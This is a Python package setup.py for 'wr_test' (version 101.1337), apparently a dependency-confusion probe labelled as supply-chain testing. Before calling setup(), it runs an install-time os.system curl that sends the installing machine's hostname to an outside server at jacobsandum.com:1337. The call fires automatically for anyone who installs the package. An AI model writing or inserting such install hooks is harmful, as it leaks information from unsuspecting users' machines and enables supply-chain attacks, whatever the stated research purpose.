from setuptools import setup, find_packages
import os

hostname = os.uname()[1]
if not hostname:
    hostname='failed'
os.system('curl http://jacobsandum.com:1337/setup-' + hostname)
setup(
    name='wr_test',
    version='101.1337',
    author='J sandum',
    author_email='jsandum@wisc.edu',
    description='Do NOT USE, onyl for testing supply chain',
    packages=find_packages(),
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.1',
)
